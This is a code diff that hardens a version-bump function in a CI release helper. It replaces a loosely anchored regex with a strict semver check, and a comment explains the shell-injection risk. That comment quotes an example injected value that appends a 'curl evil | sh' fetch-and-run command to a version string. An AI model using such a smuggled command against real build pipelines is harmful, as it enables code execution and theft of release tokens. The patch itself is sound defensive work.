@@ -76,8 +76,32 @@ function parseSemver(version) {
  * @returns {string} The new version string
  */
 function computeNewVersion(currentVersion, bump) {
-  /* If the bump argument looks like a version number, use it directly */
-  if (/^\d+\.\d+\.\d+/.test(bump)) {
+  /*
+   * If the bump argument looks like a version number, use it directly.
+   *
+   * SECURITY: this value round-trips to stdout and is captured into a CI
+   * step output that is then `${{ }}`-interpolated into `run:` shells in
+   * version-bump.yml. The previous regex `/^\d+\.\d+\.\d+/` was anchored
+   * only at the START, so an input like `1.2.3; curl evil | sh` matched
+   * (it *starts* with a version) and passed straight through verbatim —
+   * a shell-injection vector for anyone who can trigger the workflow,
+   * defeating the env:-passing mitigation and risking RELEASE_PAT theft.
+   *
+   * The pattern is now fully anchored (`^…$`) and accepts only a strict
+   * semver core plus optional pre-release / build-metadata segments drawn
+   * from the semver-legal alphabet `[0-9A-Za-z.-]` — no whitespace, no
+   * shell metacharacters. Anything that resembles a version but fails the
+   * strict shape is rejected below rather than silently passed through.
+   */
+  const looksLikeVersion = /^\d+\.\d+\.\d+/.test(bump);
+  if (looksLikeVersion) {
+    const STRICT_SEMVER = /^\d+\.\d+\.\d+(?:-[0-9A-Za-z.-]+)?(?:\+[0-9A-Za-z.-]+)?$/;
+    if (!STRICT_SEMVER.test(bump)) {
+      console.error(
+        `Error: "${bump}" is not a valid version string. Expected X.Y.Z with an optional -prerelease / +build suffix (semver-legal characters only).`,
+      );
+      process.exit(1);
+    }
     return bump;
   }
 
